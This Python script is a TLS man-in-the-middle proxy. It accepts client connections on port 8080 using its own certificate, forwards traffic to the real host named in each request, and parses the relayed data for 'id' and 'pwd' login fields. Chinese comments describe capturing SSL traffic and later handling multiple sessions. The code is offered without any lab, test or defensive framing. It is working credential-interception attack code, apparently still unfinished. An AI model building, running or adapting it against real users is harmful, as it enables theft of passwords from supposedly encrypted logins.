import ssl
import socket
import subprocess
import threading
import re
from urllib.parse import parse_qs

def start_ssl_server():
    def get_hostname_from_request(data):
        try:
            # Decode the data and split it into headers
            headers = data.decode().split('\r\n')
            # Extract the hostname from the 'Host' header
            hostname = next((header.split('Host: ')[1] 
                             for header in headers 
                             if header.startswith('Host:')), None)
            return hostname
        except UnicodeDecodeError:
            # Handle decoding errors
            pass
        return None

    def get_id_pwd(data):
        # Parse the query string data into a dictionary
        parsed_dict = parse_qs(data)
        # Extract the 'id' and 'pwd' values from the parsed dictionary
        id_value = parsed_dict.get('id', [''])[0]
        pwd_value = parsed_dict.get('pwd', [''])[0]
        # Return a formatted string with the ID and Password if both are present
        return f"ID: {id_value}, Password: {pwd_value}" if id_value and pwd_value else None
            

    # Create an SSL context for the server with client authentication purpose
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    # Load the server's certificate and private key
    context.load_cert_chain(certfile="certificates/host.crt", keyfile="certificates/host.key")

    # Create a TCP/IP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Allow the socket to reuse the address
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Bind the socket to the address and port
    s.bind(('0.0.0.0', 8080))
    # Listen for incoming connections with a backlog of 5
    s.listen(5)
    print("SSL server listening on port 8080")
    while True:
        try:
            client_socket, addr = s.accept()
            ssl_socket = context.wrap_socket(client_socket, server_side=True)
            print(f"Accepted connection from {addr}")
            ssl_socket.settimeout(0.01)
            try:
                init_requst = ssl_socket.recv(4196)
                # print(init_requst)
                hostname = get_hostname_from_request(init_requst)
                server_socket = create_ssl_connection(hostname)
                server_socket.send(init_requst)
            except socket.timeout:
                print("Timeout occurred12312312")
                continue
            server_socket.settimeout(0.1)
            while True:
                try:
                    data1 = ssl_socket.recv(4196)
                    if data1: 
                        # 先把ssl收起來再把它給Server
                        # 之後用在用multithread handle multi session
                        # print('data1',data1)
                        server_socket.send(data1)
                        get_id_pwd(data1.decode())
                except socket.timeout:
                    # print("data 1 Timeout occurred")
                    pass
                try:            
                    data2 = server_socket.recv(4196)
                    if data2: ssl_socket.send(data2)
                    # print('data2',data2)
                    # print(f"Data1: {len(data1)} bytes, data2: {len(data2)} bytes")
                    # if not data1 and not data1: 
                        # print("Closing connection")
                        # break
                except socket.timeout:
                    # print("data 2 Timeout occurred")
                    pass
                except Exception as e:
                    print(f"An error occurred during data transfer: {e}")
                    break


        except ssl.SSLError as e:
            print(f"SSL error occurred: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            server_socket.close()
            ssl_socket.close()
            
def create_ssl_connection(target_host_name):
    # Define the target hostname and port for the SSL connection
    hostname = target_host_name
    port = 443
    
    # Create a default SSL context
    context = ssl.create_default_context()
    
    # Create a TCP connection to the target hostname and port
    sock = socket.create_connection((hostname, port))
    
    # Wrap the TCP connection with SSL
    ssl_sock = context.wrap_socket(sock, server_hostname=hostname)
    
    # Print confirmation of the SSL connection establishment
    ip_address = ssl_sock.getpeername()[0]
    print(f"SSL connection established with {hostname} at {ip_address}:{port}.")
    
    # Return the SSL-wrapped socket
    return ssl_sock


start_ssl_server()